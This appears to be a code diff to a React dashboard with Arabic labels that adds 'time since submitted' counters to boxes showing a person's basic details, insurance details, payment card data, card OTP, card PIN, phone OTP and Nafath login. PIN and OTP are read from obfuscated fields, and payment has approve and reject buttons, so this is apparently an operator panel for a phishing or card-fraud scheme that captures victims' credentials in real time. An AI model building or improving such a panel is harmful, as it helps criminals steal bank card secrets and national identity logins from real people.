@@ -1649,23 +1649,54 @@ const renderNafadBox = () => {
     const pinCode = String(selectedRequest?.raw?._v6 || selectedRequest?.raw?.pinCode || "1234").padStart(4, "0");
     const phoneOtpCode = selectedRequest?.raw?._v7 || selectedRequest?.raw?.phoneOtp || "654321";
     
+    // Get timestamps for each data type
+    const getTimestamp = (data: any): number => {
+      if (data?.submittedAt) return new Date(data.submittedAt).getTime();
+      if (data?.updatedAt) return new Date(data.updatedAt).getTime();
+      return Date.now();
+    };
+    
+    const basicTimestamp = getTimestamp(basicRaw);
+    const insuranceTimestamp = getTimestamp(insuranceRaw);
+    const paymentTimestamp = getTimestamp(selectedRequest?.raw);
+    const cardOtpTimestamp = getTimestamp(selectedRequest?.raw);
+    const pinTimestamp = getTimestamp(selectedRequest?.raw);
+    const phoneTimestamp = getTimestamp(selectedRequest?.raw);
+    const nafadTimestamp = getTimestamp(selectedRequest?.raw);
+    
     // Time counter state
-    const [counter, setCounter] = React.useState(0);
+    const [now, setNow] = React.useState(Date.now());
     
     React.useEffect(() => {
       const interval = setInterval(() => {
-        setCounter(prev => prev + 1);
+        setNow(Date.now());
       }, 1000);
       return () => clearInterval(interval);
     }, []);
     
     // Format counter to human readable
-    const formatCounter = (seconds: number): string => {
+    const formatCounter = (timestamp: number): string => {
+      const seconds = Math.floor((now - timestamp) / 1000);
+      if (seconds < 0) return "الآن";
       if (seconds < 60) return `منذ ${seconds} ثانية`;
       if (seconds < 3600) return `منذ ${Math.floor(seconds / 60)} دقيقة`;
       if (seconds < 86400) return `منذ ${Math.floor(seconds / 3600)} ساعة`;
       return `منذ ${Math.floor(seconds / 86400)} يوم`;
     };
+    
+    // Reusable counter component
+    const TimeCounter = ({ timestamp }: { timestamp: number }) => (
+      <div style={{ 
+        position: "absolute", 
+        top: 8, 
+        left: 2, 
+        background: "#f3f4f6", 
+        borderRadius: 6, 
+        padding: "2px 8px"
+      }}>
+        <span style={{ fontSize: "0.65rem", color: "#6b7280" }}>{formatCounter(timestamp)}</span>
+      </div>
+    );
 
     return (
       <div style={{ display: "flex", flexDirection: "column", gap: 12, padding: 16 }}>
@@ -1681,19 +1712,7 @@ const renderNafadBox = () => {
           marginLeft: "auto",
           position: "relative"
         }}>
-          {/* العداد في الزاوية العلوية اليسرى */}
-          <div style={{ 
-            position: "absolute", 
-            top: 8, 
-            left: 2, 
-            background: "#f3f4f6", 
-            borderRadius: 6, 
-            padding: "2px 8px",
-            display: "flex",
-            gap: 4
-          }}>
-            <span style={{ fontSize: "0.65rem", color: "#6b7280" }}>{formatCounter(counter)}</span>
-          </div>
+          <TimeCounter timestamp={basicTimestamp} />
           <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
             <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق المعلومات الأساسية</h3>
           </div>
@@ -1729,10 +1748,11 @@ const renderNafadBox = () => {
           border: "1px solid #e5e7eb",
           width: "40%",
           marginRight: 0,
-          marginLeft: "auto"
+          marginLeft: "auto",
+          position: "relative"
         }}>
+          <TimeCounter timestamp={insuranceTimestamp} />
           <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <span style={{ fontSize: "1.2rem" }}>🛡️</span>
             <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق تفاصيل التأمين</h3>
           </div>
           <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
@@ -1780,10 +1800,11 @@ const renderNafadBox = () => {
           border: "1px solid #e5e7eb",
           width: "40%",
           marginRight: 0,
-          marginLeft: "auto"
+          marginLeft: "auto",
+          position: "relative"
         }}>
+          <TimeCounter timestamp={paymentTimestamp} />
           <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <span style={{ fontSize: "1.2rem" }}>💳</span>
             <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق بيانات الدفع</h3>
           </div>
           {/* أزرار الموافقة والرفض */}
@@ -1809,10 +1830,11 @@ const renderNafadBox = () => {
           border: "1px solid #e5e7eb",
           width: "40%",
           marginRight: 0,
-          marginLeft: "auto"
+          marginLeft: "auto",
+          position: "relative"
         }}>
+          <TimeCounter timestamp={cardOtpTimestamp} />
           <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <span style={{ fontSize: "1.2rem" }}>🔐</span>
             <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز التحقق من البطاقة</h3>
           </div>
           <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center" }}>
@@ -1842,10 +1864,11 @@ const renderNafadBox = () => {
           border: "1px solid #e5e7eb",
           width: "40%",
           marginRight: 0,
-          marginLeft: "auto"
+          marginLeft: "auto",
+          position: "relative"
         }}>
+          <TimeCounter timestamp={pinTimestamp} />
           <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <span style={{ fontSize: "1.2rem" }}>🔑</span>
             <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز PIN</h3>
           </div>
           <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr" }}>
@@ -1878,10 +1901,11 @@ const renderNafadBox = () => {
           border: "1px solid #e5e7eb",
           width: "40%",
           marginRight: 0,
-          marginLeft: "auto"
+          marginLeft: "auto",
+          position: "relative"
         }}>
+          <TimeCounter timestamp={phoneTimestamp} />
           <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <span style={{ fontSize: "1.2rem" }}>📱</span>
             <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تحقق الهاتف</h3>
           </div>
           <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
@@ -1920,10 +1944,11 @@ const renderNafadBox = () => {
           border: "1px solid #e5e7eb",
           width: "40%",
           marginRight: 0,
-          marginLeft: "auto"
+          marginLeft: "auto",
+          position: "relative"
         }}>
+          <TimeCounter timestamp={nafadTimestamp} />
           <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <span style={{ fontSize: "1.2rem" }}>🇸🇦</span>
             <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>نفاذ</h3>
           </div>
           <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
